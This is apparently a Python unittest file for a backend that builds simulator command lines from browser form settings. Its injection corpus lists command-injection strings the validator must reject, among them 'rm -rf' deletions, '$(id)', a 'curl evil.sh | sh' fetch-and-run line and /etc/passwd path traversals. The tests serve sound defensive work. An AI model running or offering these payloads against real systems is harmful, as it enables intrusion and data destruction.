#!/usr/bin/env python3
"""Security tests for the config -> argv boundary.

    python3 tests/test_validate.py

A browser form decides what process runs on this machine. This corpus is the deliverable:
if any entry stops being rejected, the boundary has regressed.

Requires the simulator binary (the whitelist is derived from its --PrintHelp).
"""

import os
import subprocess
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "backend"))

import config                                   # noqa: E402
from flags import ATTACK_TYPES, REGISTRY        # noqa: E402
from validate import Rejected, build_argv, validate_run_id   # noqa: E402

GOOD = {"numVehicles": 200, "numRsus": 56, "numControllers": 4,
        "attackType": "single_data", "attackPercent": 5,
        "warmupTime": 60, "warmupAccusationStart": 35, "trace": "manhattan"}


@unittest.skipUnless(os.path.exists(config.BINARY), "simulator binary not built")
class TestRegistry(unittest.TestCase):
    def test_registry_loads(self):
        specs = REGISTRY.load()
        self.assertGreater(len(specs), 100, "expected 100+ flags from --PrintHelp")

    def test_meta_options_are_excluded(self):
        """ns-3's own --Print* options must never be reachable by a client."""
        REGISTRY.load()
        for name in ("PrintHelp", "PrintGlobals", "PrintAttributes", "selftest"):
            self.assertNotIn(name, REGISTRY)

    def test_server_controlled_flags_are_excluded(self):
        REGISTRY.load()
        for name in ("csvPrefix", "traceFile", "debugLogs", "liteLogs"):
            self.assertNotIn(name, REGISTRY)

    def test_types_were_inferred(self):
        REGISTRY.load()
        self.assertEqual(REGISTRY["numVehicles"].type, "int")
        self.assertEqual(REGISTRY["eta"].type, "float")
        self.assertEqual(REGISTRY["blockchain"].type, "bool")
        self.assertEqual(REGISTRY["attackType"].type, "str")


@unittest.skipUnless(os.path.exists(config.BINARY), "simulator binary not built")
class TestHappyPath(unittest.TestCase):
    def test_builds_argv(self):
        argv, eff = build_argv(GOOD, "20260901-120000-single_data-abcd1234")
        self.assertEqual(argv[0], config.BINARY)
        joined = " ".join(argv)
        self.assertIn("--attackType=single_data", joined)
        self.assertIn("--numVehicles=200", joined)

    def test_server_flags_are_injected(self):
        argv, _ = build_argv(GOOD, "run-1")
        joined = " ".join(argv)
        # without debugLogs the UI would receive almost no events at all
        self.assertIn("--debugLogs=1", joined)
        self.assertIn("--liteLogs=1", joined)
        self.assertIn("--csvPrefix=", joined)
        self.assertIn("manhattan.tcl", joined)

    def test_synthetic_trace_omits_tracefile(self):
        argv, _ = build_argv({**GOOD, "trace": "synthetic"}, "run-1")
        self.assertNotIn("--traceFile=", " ".join(argv))

    def test_argv_is_a_list_of_separate_tokens(self):
        """Rule 5: argv elements reach execve() verbatim. No shell, ever."""
        argv, _ = build_argv(GOOD, "run-1")
        self.assertIsInstance(argv, list)
        self.assertTrue(all(isinstance(a, str) for a in argv))

    def test_all_nine_attack_types_accepted(self):
        for a in ATTACK_TYPES:
            build_argv({**GOOD, "attackType": a}, "run-1")


@unittest.skipUnless(os.path.exists(config.BINARY), "simulator binary not built")
class TestInjectionCorpus(unittest.TestCase):
    """Every entry must raise Rejected. This is the security deliverable."""

    def _reject(self, cfg, why):
        with self.assertRaises(Rejected, msg=f"NOT REJECTED: {why} -> {cfg}"):
            build_argv(cfg, "run-1")

    def test_shell_metacharacters_in_enum_field(self):
        for payload in ('x; rm -rf ~', 'single_data; id', '$(id)', '`id`',
                        'single_data && curl evil.sh | sh', 'single_data\nrm -rf /',
                        'single_data --csvPrefix=/etc/passwd', '../../../bin/sh'):
            self._reject({**GOOD, "attackType": payload}, "attackType injection")

    def test_unknown_flag_names(self):
        for name in ("rm", "--", "-rf", "PrintAttributes", "notAFlag",
                     "numVehicles ", "NUMVEHICLES", "numVehicles​"):
            self._reject({**GOOD, name: 1}, f"unknown flag {name!r}")

    def test_server_controlled_flags_rejected(self):
        for name, val in (("csvPrefix", "/etc/x"), ("traceFile", "/etc/passwd"),
                          ("debugLogs", 0), ("liteLogs", 0), ("animFile", "/tmp/x")):
            self._reject({**GOOD, name: val}, f"client set {name}")

    def test_out_of_range_numbers(self):
        for name, val in (("numVehicles", 99999), ("numVehicles", 0),
                          ("numVehicles", -1), ("attackPercent", 999),
                          ("attackPercent", -5), ("seed", 0),
                          ("simTime", 99999), ("commRange", 0)):
            self._reject({**GOOD, name: val}, f"{name}={val}")

    def test_more_vehicles_than_the_trace_has(self):
        """The Manhattan trace has exactly 200 nodes; extras would sit at the origin."""
        self._reject({**GOOD, "numVehicles": 250}, "numVehicles > trace nodes")

    def test_warmup_before_vehicles_exist(self):
        """Only one vehicle exists at t=0; the last inserts at t=42."""
        self._reject({**GOOD, "warmupAccusationStart": 5}, "warmup too early")

    def test_non_numeric_where_number_expected(self):
        for val in ("200; id", "2e400", "NaN", "inf", None, [], {}, True):
            self._reject({**GOOD, "numVehicles": val}, f"numVehicles={val!r}")

    def test_unknown_trace_key(self):
        for val in ("../../etc/passwd", "/etc/passwd", "manhattan.tcl", "", None):
            self._reject({**GOOD, "trace": val}, f"trace={val!r}")

    def test_bad_run_ids(self):
        for rid in ("../escape", "a/b", "", "x" * 65, "run id", "run;id",
                    "..", ".", "/abs", "run\x00id"):
            with self.assertRaises(Rejected, msg=f"NOT REJECTED: run_id {rid!r}"):
                validate_run_id(rid)

    def test_body_must_be_an_object(self):
        for body in ("string", 42, None, ["a"]):
            with self.assertRaises(Rejected):
                build_argv(body, "run-1")


@unittest.skipUnless(os.path.exists(config.BINARY), "simulator binary not built")
class TestNoShellAnywhere(unittest.TestCase):
    def test_source_tree_has_no_shell_true(self):
        """Rule 5 is the one that must never break — assert it across the backend."""
        hits = subprocess.run(
            ["grep", "-rn", "shell=True", os.path.join(ROOT, "backend")],
            capture_output=True, text=True).stdout.strip()
        self.assertEqual(hits, "", f"shell=True found:\n{hits}")

    def test_injected_payload_would_be_one_inert_argv_token(self):
        """Defence in depth: even if an enum check were removed, argv keeps it inert."""
        argv, _ = build_argv(GOOD, "run-1")
        self.assertFalse(any(";" in a or "|" in a or "`" in a or "$(" in a
                             for a in argv))


if __name__ == "__main__":
    unittest.main(verbosity=2)
